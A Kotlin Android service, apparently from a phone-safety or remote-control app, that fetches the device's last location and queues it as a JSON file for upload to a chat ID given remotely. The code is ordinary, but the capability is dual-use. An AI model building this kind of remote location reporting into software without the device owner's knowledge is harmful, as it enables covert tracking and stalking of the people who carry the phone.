package com.save.me

import android.app.Service
import android.content.Context
import android.content.Intent
import android.os.IBinder
import android.util.Log
import kotlinx.coroutines.*
import java.io.File
import java.io.FileOutputStream

class LocationService : Service() {
    private val job = SupervisorJob()
    private val scope = CoroutineScope(Dispatchers.Default + job)

    companion object {
        const val EXTRA_CHAT_ID = "chat_id"

        fun start(context: Context, chatId: String? = null) {
            val intent = Intent(context, LocationService::class.java)
            chatId?.let { intent.putExtra(EXTRA_CHAT_ID, it) }
            context.startForegroundService(intent)
        }
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        val chatId = intent?.getStringExtra(EXTRA_CHAT_ID)
        scope.launch {
            try {
                val location = LocationBackgroundHelper.getLastLocation(this@LocationService)
                if (location != null) {
                    Log.d("LocationService", "Location: ${location.latitude}, ${location.longitude}")
                    if (chatId != null) {
                        val file = File(getExternalFilesDir(null), "remote_location_${System.currentTimeMillis()}.json")
                        FileOutputStream(file).use { out ->
                            out.write(
                                """{"lat":${location.latitude},"lng":${location.longitude},"timestamp":${location.time}}""".toByteArray()
                            )
                        }
                        UploadManager.queueUpload(file, chatId, "location")
                    }
                } else {
                    Log.e("LocationService", "Location not found")
                }
            } catch (e: Exception) {
                Log.e("LocationService", "Error: $e")
            } finally {
                stopSelf()
            }
        }
        return START_NOT_STICKY
    }

    override fun onDestroy() {
        super.onDestroy()
        job.cancel()
    }

    override fun onBind(intent: Intent?): IBinder? = null
}